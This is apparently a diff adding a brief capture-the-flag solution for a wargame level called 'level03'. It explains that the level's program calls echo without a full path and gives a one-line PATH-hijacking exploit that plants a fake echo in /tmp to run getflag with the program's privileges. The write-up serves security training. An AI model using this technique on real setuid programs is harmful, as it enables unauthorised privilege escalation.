@@ -1,0 +1,3 @@
+The level03 executable use echo to print "Exploit me", lets just add a new "echo" command as a getflag command
+
+echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
